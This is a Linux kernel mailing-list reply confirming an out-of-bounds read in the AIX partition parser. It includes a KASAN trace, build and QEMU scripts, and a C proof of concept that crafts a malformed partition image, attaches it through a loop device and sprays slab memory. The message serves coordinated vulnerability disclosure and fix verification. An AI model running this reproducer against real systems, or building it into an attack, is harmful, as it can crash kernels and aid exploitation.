Received: from mail-pg1-f178.google.com (mail-pg1-f178.google.com [209.85.215.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DF0F7288AD
	for <linux-block@vger.kernel.org>; Sun, 12 Jul 2026 00:19:13 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1783815555; cv=none; b=ssV3PzL+CqOrP2MMBQKmiXGHS9lmNxr3t6sL6+HVeNgAz4NmsfGtn5MDIppzg5IIsVcliqPbc949WxPXA6Iz3UWJwQimzGuo+9dOjE4dSsAYY5rjs15p73D4Gr3NvxmxVtdUWyH3q3NewGhhlNpasIeJ0KbefSDCS06eGEC8rT4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1783815555; c=relaxed/simple;
	bh=8IJ2V63sobWpgd4PEF/GK9G1iic5XlP82QU3g4LWw9g=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=EWUNkyST6NA0t6A1zCj1g+79bcfCnZPLv7a/AilZ61j/bmRng9QS1gZ7s60E+Lgr36gpV4zoj+C4h/lMx1Ypp6rQIWLGODm+EWFGoPF+Z0VubD6SMiCv70nDK9Aj66I4JMitEYbyW43alnXK5rusc2rBo7FCcRZtEAHz0TlXPa4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=RwSprg+6; arc=none smtp.client-ip=209.85.215.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="RwSprg+6"
Received: by mail-pg1-f178.google.com with SMTP id 41be03b00d2f7-c9eefcf9175so1717746a12.3
        for <linux-block@vger.kernel.org>; Sat, 11 Jul 2026 17:19:13 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1783815553; x=1784420353; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=UGIUI4971Wf5/ZTIF8ypDWSQ4w5gZ8JSxr9SBw8ji7M=;
        b=RwSprg+6TJoFB37akRcLVqh930kRCX8j6NMazkoVhoNIW/xwvGvD6jEuOzWgzzFuNB
         Azo1x95SN+NotlSxhOXZXl8/6XXo65PJaHMychcMPrJ1K6mtxAobkKiVNGjlwELcKquk
         itA6sQFdxcX5hS03e6Rep5p820Cg0AaANXNjP2IAnhJfqhH79DaKGLwl89vC4fY5BAB5
         r1aRmZlxa1heKWOpd6bZkyK0AIVcQpD29I0ifVv85Y0OoMyzDVhOtf/SrZKpbe/Y7pH2
         OCtSB71lxgdC/X6t8xtTw37+HZC+33pNqFQv0tnpS3oka9+rQSe2f42g3wffkdCsBr1d
         x+rA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1783815553; x=1784420353;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=UGIUI4971Wf5/ZTIF8ypDWSQ4w5gZ8JSxr9SBw8ji7M=;
        b=gelbriLV7avjlM98dsyb6VVty9CeOfR6KHkKoOO3+jVBrJTsucu0n5U3dlEJtxf1yq
         RCvWascihbyk7mEL0nzQa39DNYAQtHp5M3sn6sssuo17oYab4tmIPehhLu3rBTiW/bYG
         EDEq4qLTbtEfYgvrNittU1IkXIsdIVjsZU7JT18bMfkr9Rf4h5VyaBNCaqI7MbwnBrsT
         GXnnkZpMmxOk/LZHGZfWLHo7ubJWiGFJWMdeNXSEM7mL3udjDoCUGilY05ApdBBVKSlV
         LFi77Cj5J3XfiilfIuppYJJVpOyXJppNqYpqeO9v/zPRYEPP8Ry1JQgMY9ogyOvmwEzC
         m4JA==
X-Forwarded-Encrypted: i=1; AHgh+RoUN7VVt9wxdF+cx2lKetIePzCBTTmN+US3i5y77Rvk7VVvkFlm+udBD6X3moLg9ml76hahqZmzfKdt5g==@vger.kernel.org
X-Gm-Message-State: AOJu0YxG0//bcvJqoViLc9qGOm/QJrc1SgDHelz/hpicASa4WzE7OXKx
	5xp2kCUTkwAz9KCAXba8GVStYXuKrWVBw9vI9ChTV2/P7Wsu/GWSBR1S
X-Gm-Gg: AfdE7cl2BZjf9qF0NRCw2ZS7Ma/AIvePctUS8ar+2osda9X85fFCHve2TScjWxyA+mT
	OXzkr4+LJpAfH18YbsiIgLsVLuRB7rEaL4XTXRGdUHmzecC4fKRuj+5q0aDA5TACYmMVZjkHTPr
	4uZc+PkoIvw6f9lxxOkOiXoODvejI+ElrvoVgSM0jByDNfNcCVJoT94L2YRH6hHJM1/gzSQ9Ii+
	zDh0qJpI67yRw5TmGQWfvwvIfC/Hpf+U5Vs3nR1oxYcFPZqbNToaCCW/2qpvczHLNJOLq2d9R+X
	P2wrnGnQ1b51R1jxMTrBDS8UMRe8oQaUgwOQOLQpJyCwEMm8sUfv1DNLys1m0CuLjv7jDFTL56c
	hmF8TdFNmU0YYZd9edECKqxFow5Ciukof0nlBtkNvyXjY+sh93kieMSwmV+FU762/VDe6REKy3Q
	/BOQzSgMAgy+X2balopoHzWM1WdIKDtfZX0eMlhfImwQA29ucH9NMG0AmOefzNKRVJ
X-Received: by 2002:a05:6a21:4606:b0:3bf:6c08:2848 with SMTP id adf61e73a8af0-3c1108c1c8amr4758262637.55.1783815553098;
        Sat, 11 Jul 2026 17:19:13 -0700 (PDT)
Received: from nixos (47-146-72-123.vng01.snbb.ca.frontiernet.net. [47.146.72.123])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-13b924258a2sm18133288c88.1.2026.07.11.17.19.12
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 11 Jul 2026 17:19:12 -0700 (PDT)
From: Jay Vadayath <jkrshnmenon@gmail.com>
To: michael.bommarito@gmail.com
Cc: axboe@kernel.dk,
	kees@kernel.org,
	linux-block@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: Re: [PATCH] partitions: aix: bound the lvd scan to one sector
Date: Sat, 11 Jul 2026 17:19:02 -0700
Message-ID: <20260712001902.14177-1-jkrshnmenon@gmail.com>
X-Mailer: git-send-email 2.51.2
In-Reply-To: <20260606170721.1530005-1-michael.bommarito@gmail.com>
References: <20260606170721.1530005-1-michael.bommarito@gmail.com>
Precedence: bulk
X-Mailing-List: linux-block@vger.kernel.org
List-Id: <linux-block.vger.kernel.org>
List-Subscribe: <mailto:linux-block+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-block+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hello,

I am a security researcher and was able to independently reproduce the 
OOB read on an unpatched tree by feeding exactly that shape of image 
through a loop device with LO_FLAGS_PARTSCAN.

Image layout:
  sector 0:      AIX label magic (0xC9 0xC2 0xD4 0xC1) + MBR signature
  sector 7:      lvm_rec (vgda_len=33, vgda_sector=N, ipl_psn=1)
  sector N:      VGDA header with numlvs=0xFFFF
  sector N+1:    LVD array (zeros -- num_lps=0 keeps foundlvs at 0)

KASAN on 7.2.0-rc2 flags the read one entry past the sector buffer:

  BUG: KASAN: slab-use-after-free in aix_partition+0x3fe/0xa80
  Read of size 2 at addr ffff88810776b00e by task poc/2944
  Call Trace:
   aix_partition+0x3fe/0xa80
   msdos_partition+0x3c7/0x1200
   bdev_disk_changed+0x616/0xe70
   loop_reread_partitions+0x44/0xb0
   loop_configure+0xd02/0xdf0
   lo_ioctl+0x23d/0x1200
   blkdev_ioctl+0x412/0x490
   __x64_sys_ioctl+0x120/0x170
   do_syscall_64+0x102/0x5a0
   entry_SYSCALL_64_after_hwframe+0x77/0x7f

  The buggy address belongs to the object at ffff88810776b000
   which belongs to the cache kmalloc-64 of size 64
  The buggy address is located 14 bytes inside of
   freed 64-byte region [ffff88810776b000, ffff88810776b040)

I only confirmed the bug on an unpatched kernel; I have not yet verified
the fix on top of this reproducer.

The CONFIG options that I've used are:

  CONFIG_PARTITION_ADVANCED=y
  CONFIG_AIX_PARTITION=y
  CONFIG_MSDOS_PARTITION=y
  CONFIG_BLK_DEV_LOOP=y
  CONFIG_KASAN=y
  CONFIG_KASAN_GENERIC=y

Any defconfig with the options above added is enough to reproduce.

======= build.sh =======
#!/usr/bin/env bash
# build.sh -- Build kernel variants for aix_partition OOB read reproduction.
# Usage: ./build.sh <kernel-source-dir>
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC="${1:?Usage: $0 <kernel-source-dir>}"
SRC="$(realpath "$SRC")"

NPROC="$(nproc)"
CONFIG_SRC="$SCRIPT_DIR/kernel.config"

# -- Build PoC binary ------------------------------------------------------
echo "[build.sh] Compiling PoC ..."
gcc -static -O2 -Wall -o "$SCRIPT_DIR/poc_bin" "$SCRIPT_DIR/poc.c"
echo "[build.sh] PoC compiled -> $SCRIPT_DIR/poc_bin"

# -- Ensure source tree is clean ------------------------------------------
if [ -f "$SRC/.config" ] || [ -d "$SRC/.tmp_versions" ]; then
    echo "[build.sh] Cleaning source tree ..."
    make -C "$SRC" mrproper > /dev/null 2>&1 || true
fi

build_variant() {
    local variant="$1"
    local build_dir="$SCRIPT_DIR/builds/$variant"
    local log="$build_dir/build.log"

    echo "[build.sh] === Building variant: $variant ==="
    mkdir -p "$build_dir"

    # Start from provided config (any working defconfig will do)
    cp "$CONFIG_SRC" "$build_dir/.config"

    # Enable AIX_PARTITION (requires PARTITION_ADVANCED)
    cat >> "$build_dir/.config" <<'KOPTS'
CONFIG_PARTITION_ADVANCED=y
CONFIG_AIX_PARTITION=y
CONFIG_MSDOS_PARTITION=y
CONFIG_BLK_DEV_LOOP=y
KOPTS

    # Variant-specific options
    case "$variant" in
        asan)
            cat >> "$build_dir/.config" <<'KOPTS'
CONFIG_KASAN=y
CONFIG_KASAN_GENERIC=y
CONFIG_KASAN_OUTLINE=y
CONFIG_KASAN_STACK=y
CONFIG_KASAN_VMALLOC=y
CONFIG_SLUB_DEBUG=y
CONFIG_STACKTRACE=y
KOPTS
            ;;
        nosan)
            cat >> "$build_dir/.config" <<'KOPTS'
# CONFIG_KASAN is not set
KOPTS
            ;;
    esac

    echo "[build.sh]   olddefconfig ..."
    make -C "$SRC" O="$build_dir" olddefconfig >> "$log" 2>&1

    if ! grep -q 'CONFIG_AIX_PARTITION=y' "$build_dir/.config"; then
        echo "[build.sh] WARNING: CONFIG_AIX_PARTITION not enabled, forcing..."
        "$SRC/scripts/config" --file "$build_dir/.config" \
            --enable PARTITION_ADVANCED \
            --enable AIX_PARTITION \
            --enable MSDOS_PARTITION
        make -C "$SRC" O="$build_dir" olddefconfig >> "$log" 2>&1
    fi

    echo "[build.sh]   Building scripts ..."
    make -C "$SRC" O="$build_dir" -j1 scripts >> "$log" 2>&1 || true

    echo "[build.sh]   Building kernel (this may take a while) ..."
    make -C "$SRC" O="$build_dir" -j"$NPROC" bzImage >> "$log" 2>&1

    if [ -f "$build_dir/arch/x86/boot/bzImage" ]; then
        echo "[build.sh]   OK: $variant kernel -> $build_dir/arch/x86/boot/bzImage"
    else
        echo "[build.sh]   FAIL: $variant build failed -- check $log"
        return 1
    fi
}

build_variant asan

echo "[build.sh] All builds complete."

===== end build.sh =====

======= build_initramfs.sh =======
#!/usr/bin/env bash
# build_initramfs.sh -- Build a minimal BusyBox initramfs that runs a PoC binary.
#
# Usage:
#   ./build_initramfs.sh [OPTIONS]
#
# Options:
#   -o, --output <path>       Output path for the initramfs image
#                             (default: ./initramfs/initramfs.cpio.gz)
#   -u, --user <name>         Non-root username to create (default: "vscode")
#   -h, --help                Show this help message
#
# Requirements (installed automatically if missing via apt):
#   busybox-static

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT="$SCRIPT_DIR/initramfs/initramfs.cpio.gz"
NORMAL_USER="vscode"
WORKDIR=""

log()  { echo "[build_initramfs] $*"; }
die()  { echo "[build_initramfs] ERROR: $*" >&2; exit 1; }

usage() {
    sed -n '/^# Usage:/,/^[^#]/p' "$0" | grep '^#' | sed 's/^# \{0,1\}//'
    exit 0
}

need_cmd() {
    command -v "$1" &>/dev/null || die "'$1' not found. Install it and retry."
}

install_if_missing() {
    local pkg="$1"; shift
    local bins=("$@")
    for b in "${bins[@]}"; do
        command -v "$b" &>/dev/null && return 0
    done
    if command -v apt-get &>/dev/null; then
        log "Installing $pkg ..."
        sudo apt-get install -y --no-install-recommends "$pkg" >/dev/null
    else
        die "Cannot find ${bins[*]}. Please install $pkg manually."
    fi
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -o|--output)  OUTPUT="$2";      shift 2 ;;
        -u|--user)    NORMAL_USER="$2"; shift 2 ;;
        -h|--help)    usage ;;
        *)  echo "Unknown option: $1" >&2; exit 1 ;;
    esac
done

if [[ ! "$NORMAL_USER" =~ ^[a-z_][a-z0-9_-]*$ ]]; then
    die "Invalid --user '$NORMAL_USER'."
fi
if [[ "$NORMAL_USER" == "root" ]]; then
    die "--user cannot be 'root'."
fi

OUTPUT="$(realpath -m "$OUTPUT")"

need_cmd sudo
install_if_missing busybox-static busybox
BUSYBOX_BIN="$(command -v busybox)"

WORKDIR="$(mktemp -d /tmp/initramfs_build.XXXXXX)"
trap 'log "Cleaning up ..."; rm -rf "$WORKDIR"' EXIT

ROOT="$WORKDIR/rootfs"
log "Building rootfs in $ROOT"

mkdir -p \
    "$ROOT"/{bin,sbin,usr/bin,usr/sbin} \
    "$ROOT"/{dev,proc,sys,tmp,run,etc} \
    "$ROOT/home/$NORMAL_USER"

log "Installing BusyBox ($BUSYBOX_BIN) ..."
cp "$BUSYBOX_BIN" "$ROOT/bin/busybox"
chmod +x "$ROOT/bin/busybox"

for applet in $("$BUSYBOX_BIN" --list); do
    case "$applet" in
        ifconfig|ip|route|modprobe|insmod|rmmod|halt|poweroff|reboot|mdev)
            target="$ROOT/sbin/$applet" ;;
        *)
            target="$ROOT/bin/$applet" ;;
    esac
    [[ -e "$target" ]] || ln -s /bin/busybox "$target"
done

cat > "$ROOT/etc/passwd" <<EOF
root:x:0:0:root:/root:/bin/sh
$NORMAL_USER:x:1000:1000:$NORMAL_USER:/home/$NORMAL_USER:/bin/sh
EOF

cat > "$ROOT/etc/group" <<EOF
root:x:0:
$NORMAL_USER:x:1000:
EOF

cat > "$ROOT/init" <<INIT
#!/bin/sh
export PATH=/bin:/sbin:/usr/bin:/usr/sbin

mount -t proc     proc  /proc
mount -t sysfs    sysfs /sys
mount -t devtmpfs dev   /dev 2>/dev/null || mdev -s
mount -t tmpfs    tmpfs /tmp
mount -t tmpfs    tmpfs /run

echo 7 > /proc/sys/kernel/printk 2>/dev/null || true

if [ -x /poc ]; then
    echo "[init] Running /poc as ${NORMAL_USER} ..."

    chmod 666 /dev/loop-control 2>/dev/null || true
    for i in 0 1 2 3 4 5 6 7; do
        [ -e /dev/loop\$i ] || mknod /dev/loop\$i b 7 \$i 2>/dev/null || true
        chmod 666 /dev/loop\$i 2>/dev/null || true
    done
    chown ${NORMAL_USER}:${NORMAL_USER} /tmp 2>/dev/null || true

    cp /poc /run/poc
    chmod +x /run/poc
    su ${NORMAL_USER} -s /bin/sh -c /run/poc
    POC_EXIT=\$?
    echo "[init] /poc exited with status \$POC_EXIT"

    echo "[init] === dmesg ==="
    dmesg

    poweroff -f
fi

exec /bin/sh
INIT
chmod +x "$ROOT/init"

(
    cd "$ROOT/dev"
    if command -v fakeroot &>/dev/null; then
        _SUDO="fakeroot"
    else
        _SUDO="sudo"
    fi
    $_SUDO mknod -m 622 console c 5 1   2>/dev/null || true
    $_SUDO mknod -m 666 null    c 1 3   2>/dev/null || true
    $_SUDO mknod -m 666 zero    c 1 5   2>/dev/null || true
    $_SUDO mknod -m 666 ptmx    c 5 2   2>/dev/null || true
    $_SUDO mknod -m 620 tty0    c 4 0   2>/dev/null || true
    $_SUDO mknod -m 620 ttyS0   c 4 64  2>/dev/null || true
    $_SUDO mkdir -p pts
)

log "Packing initramfs -> $OUTPUT"
mkdir -p "$(dirname "$OUTPUT")"

(
    cd "$ROOT"
    find . | sort | cpio -o -H newc 2>/dev/null
) | gzip -9 > "$OUTPUT"

SIZE_KB=$(du -k "$OUTPUT" | cut -f1)
log "Done. Image: $OUTPUT (${SIZE_KB} KiB)"

===== end build_initramfs.sh =====

======= poc.sh =======
#!/usr/bin/env bash
# poc.sh -- Run the aix_partition OOB read PoC in QEMU guests.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOGS_DIR="$SCRIPT_DIR/logs"

rm -rf "$LOGS_DIR"
mkdir -p "$LOGS_DIR"

if [ ! -f "$SCRIPT_DIR/poc_bin" ]; then
    echo "[poc.sh] ERROR: Missing poc_bin -- run build.sh first"
    exit 1
fi

build_initramfs_with_poc() {
    echo "[poc.sh]   Building initramfs with PoC ..."
    bash "$SCRIPT_DIR/build_initramfs.sh" -o "$SCRIPT_DIR/initramfs/initramfs.cpio.gz"

    local tmpdir
    tmpdir="$(mktemp -d /tmp/initramfs_inject.XXXXXX)"
    (cd "$tmpdir" && gzip -dc "$SCRIPT_DIR/initramfs/initramfs.cpio.gz" | cpio -id 2>/dev/null)
    cp "$SCRIPT_DIR/poc_bin" "$tmpdir/poc"
    chmod +x "$tmpdir/poc"
    (cd "$tmpdir" && find . | sort | cpio -o -H newc 2>/dev/null | gzip -9) > "$SCRIPT_DIR/initramfs/initramfs.cpio.gz"
    rm -rf "$tmpdir"
    echo "[poc.sh]   Initramfs ready ($(du -sh "$SCRIPT_DIR/initramfs/initramfs.cpio.gz" | cut -f1))"
}

run_variant() {
    local variant="$1"
    local log_dir="$LOGS_DIR/$variant"
    local serial_log="$log_dir/serial.log"
    local bzImage="$SCRIPT_DIR/builds/$variant/arch/x86/boot/bzImage"

    if [ ! -f "$bzImage" ]; then
        echo "[poc.sh] SKIP: $bzImage not found"
        return 0
    fi

    echo "[poc.sh] ========================================="
    echo "[poc.sh] Running variant: $variant"
    echo "[poc.sh] ========================================="
    mkdir -p "$log_dir"

    build_initramfs_with_poc

    echo "[poc.sh]   Launching QEMU ($variant) ..."

    local accel
    if [ -e /dev/kvm ]; then
        accel="-accel kvm"
    else
        accel="-accel tcg"
    fi

    qemu-system-x86_64 \
        -machine pc \
        $accel \
        -m 4096 \
        -smp 2 \
        -kernel "$bzImage" \
        -initrd "$SCRIPT_DIR/initramfs/initramfs.cpio.gz" \
        -append "console=ttyS0 root=/dev/ram rdinit=/init quiet loglevel=3 printk.devkmsg=off" \
        -nographic \
        -no-reboot \
        -net none \
        > "$serial_log" 2>&1 &
    local qemu_pid=$!

    local max_wait=180
    local waited=0
    while kill -0 "$qemu_pid" 2>/dev/null && [ "$waited" -lt "$max_wait" ]; do
        sleep 5
        waited=$((waited + 5))

        if grep -q 'Power down\|reboot:' "$serial_log" 2>/dev/null; then
            echo "[poc.sh]   VM shut down after ${waited}s"
            break
        fi
    done

    if kill -0 "$qemu_pid" 2>/dev/null; then
        echo "[poc.sh]   QEMU timed out after ${max_wait}s, killing ..."
        kill "$qemu_pid" 2>/dev/null || true
        sleep 2
        kill -9 "$qemu_pid" 2>/dev/null || true
    fi
    wait "$qemu_pid" 2>/dev/null || true

    echo "[poc.sh]   QEMU ($variant) finished. Log: $(wc -l < "$serial_log") lines"

    echo "[poc.sh]   Checking serial log for crash signatures ..."
    if grep -qE 'BUG: KASAN' "$serial_log" 2>/dev/null; then
        echo "[poc.sh]   KASAN bug detected in $variant"
        echo ""
        grep -A40 'BUG: KASAN' "$serial_log" | head -50
        echo ""
    elif grep -qE 'kernel BUG|Oops|general protection fault' "$serial_log" 2>/dev/null; then
        echo "[poc.sh]   Kernel crash detected in $variant"
        grep -A30 'kernel BUG\|Oops\|general protection fault' "$serial_log" | head -50
    else
        echo "[poc.sh]   No crash signature found in $variant serial log"
    fi

    if grep -q 'aix_partition' "$serial_log" 2>/dev/null; then
        echo "[poc.sh]   aix_partition appears in log"
    fi

    echo ""
}

run_variant asan
run_variant nosan

echo "[poc.sh] ========================================="
echo "[poc.sh] All runs complete. Logs in $LOGS_DIR"
echo "[poc.sh] ========================================="

for variant in asan nosan; do
    log="$LOGS_DIR/$variant/serial.log"
    if [ -f "$log" ]; then
        echo ""
        echo "=== $variant serial.log (KASAN/BUG lines) ==="
        grep -E 'BUG: KASAN|aix_partition|msdos_partition|loop_configure|loop_reread' "$log" | head -20
        echo ""
        echo "=== $variant serial.log tail ==="
        tail -30 "$log"
    fi
done

===== end poc.sh =====

======= poc.c =======
/*
 * poc.c -- Trigger OOB read in aix_partition() via loop device + PARTSCAN.
 * Build: gcc -static -O2 -Wall -o poc poc.c
 * Run:   ./poc   (as unprivileged user; /dev/loop* must be writable)
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/loop.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define SECTOR_SIZE 512

static void die(const char *msg) {
	perror(msg);
	exit(1);
}

static void put_be16(uint8_t *p, uint16_t v) {
	p[0] = (uint8_t)(v >> 8);
	p[1] = (uint8_t)(v & 0xff);
}

static void put_be32(uint8_t *p, uint32_t v) {
	p[0] = (uint8_t)(v >> 24);
	p[1] = (uint8_t)((v >> 16) & 0xff);
	p[2] = (uint8_t)((v >> 8) & 0xff);
	p[3] = (uint8_t)(v & 0xff);
}

static void write_sector(int fd, uint64_t lba, const void *buf, size_t len) {
	off_t off = (off_t)lba * SECTOR_SIZE;
	ssize_t w = pwrite(fd, buf, len, off);
	if (w < 0 || (size_t)w != len)
		die("pwrite(sector)");
}

static void craft_aix_image(int fd, uint32_t vgda_sector) {
	const uint32_t vgda_len = 33;
	const uint16_t numlvs = 0xFFFF;

	off_t img_size = (off_t)(vgda_sector + vgda_len + 4) * SECTOR_SIZE;
	if (img_size < 8 * SECTOR_SIZE)
		img_size = 8 * SECTOR_SIZE;
	if (ftruncate(fd, img_size))
		die("ftruncate");

	uint8_t sec[SECTOR_SIZE];

	/* Sector 0: AIX label magic */
	memset(sec, 0, sizeof(sec));
	sec[0] = 0xC9; sec[1] = 0xC2; sec[2] = 0xD4; sec[3] = 0xC1;
	sec[510] = 0x55; sec[511] = 0xAA;
	write_sector(fd, 0, sec, sizeof(sec));

	/* Sector 7: lvm_rec */
	memset(sec, 0, sizeof(sec));
	sec[0] = '_'; sec[1] = 'L'; sec[2] = 'V'; sec[3] = 'M';
	put_be32(&sec[24], vgda_len);
	put_be32(&sec[28], vgda_sector);
	put_be16(&sec[46], 9);
	put_be16(&sec[60], 1);
	write_sector(fd, 7, sec, sizeof(sec));

	/* Sector vgda_sector: VGDA header */
	memset(sec, 0, sizeof(sec));
	put_be16(&sec[24], numlvs);
	write_sector(fd, vgda_sector, sec, sizeof(sec));

	/* Sector vgda_sector+1: LVD array (all zeros) */
	memset(sec, 0, sizeof(sec));
	write_sector(fd, vgda_sector + 1, sec, sizeof(sec));

	if (fsync(fd))
		die("fsync");
}

static int do_loop_trigger(int img_fd) {
	int ctl = open("/dev/loop-control", O_RDWR | O_CLOEXEC);
	if (ctl < 0) {
		perror("open(/dev/loop-control)");
		return -1;
	}

	int num = ioctl(ctl, LOOP_CTL_GET_FREE);
	close(ctl);
	if (num < 0) {
		perror("ioctl(LOOP_CTL_GET_FREE)");
		return -1;
	}

	char path[64];
	snprintf(path, sizeof(path), "/dev/loop%d", num);
	int lfd = open(path, O_RDWR | O_CLOEXEC);
	if (lfd < 0) {
		perror(path);
		return -1;
	}

	struct loop_config cfg;
	memset(&cfg, 0, sizeof(cfg));
	cfg.fd = (unsigned int)img_fd;
	cfg.info.lo_flags = LO_FLAGS_PARTSCAN;

	int ret = ioctl(lfd, LOOP_CONFIGURE, &cfg);
	if (ret < 0) {
		if (ioctl(lfd, LOOP_SET_FD, (unsigned long)img_fd) < 0) {
			perror("LOOP_SET_FD");
			close(lfd);
			return -1;
		}
		struct loop_info64 info;
		memset(&info, 0, sizeof(info));
		info.lo_flags = LO_FLAGS_PARTSCAN;
		if (ioctl(lfd, LOOP_SET_STATUS64, &info) < 0) {
			perror("LOOP_SET_STATUS64");
			ioctl(lfd, LOOP_CLR_FD, 0);
			close(lfd);
			return -1;
		}
	}

	usleep(100000);
	ioctl(lfd, LOOP_CLR_FD, 0);
	close(lfd);
	return 0;
}

/*
 * Spray small slab allocations and free them to create KASAN-poisoned
 * slab pages, increasing the chance that the OOB read in aix_partition()
 * hits KASAN-poisoned memory in the direct map.
 */
static void slab_spray(void) {
	int i;
	int fds[256];
	for (i = 0; i < 256; i++) {
		char name[64];
		snprintf(name, sizeof(name), "/tmp/spray_%d", i);
		fds[i] = open(name, O_CREAT | O_RDWR | O_CLOEXEC, 0666);
	}
	for (i = 0; i < 256; i++) {
		if (fds[i] >= 0)
			close(fds[i]);
		char name[64];
		snprintf(name, sizeof(name), "/tmp/spray_%d", i);
		unlink(name);
	}
}

int main(void) {
	fprintf(stderr, "[poc] OOB read in aix_partition() PoC\n");

	uint32_t vgda_sectors[] = {14, 22, 30, 38, 46, 54, 62, 70, 78, 86};
	int num_variants = sizeof(vgda_sectors) / sizeof(vgda_sectors[0]);
	int attempt, variant;

	for (attempt = 0; attempt < 5; attempt++) {
		fprintf(stderr, "[poc] === Round %d/5 ===\n", attempt + 1);

		slab_spray();

		for (variant = 0; variant < num_variants; variant++) {
			uint32_t vs = vgda_sectors[variant];
			fprintf(stderr, "[poc] vgda_sector=%u\n", vs);

			char img_path[64];
			snprintf(img_path, sizeof(img_path), "/tmp/aix_%u.img", vs);
			int img_fd = open(img_path, O_CREAT | O_TRUNC | O_RDWR | O_CLOEXEC, 0666);
			if (img_fd < 0) {
				perror(img_path);
				continue;
			}

			craft_aix_image(img_fd, vs);
			do_loop_trigger(img_fd);

			close(img_fd);
			unlink(img_path);
		}
	}

	fprintf(stderr, "[poc] === dmesg output ===\n");
	fflush(stderr);
	(void)!system("dmesg | tail -200");

	fprintf(stderr, "[poc] Done.\n");
	return 0;
}

===== end poc.c =====

Thanks
Jay Vadayath
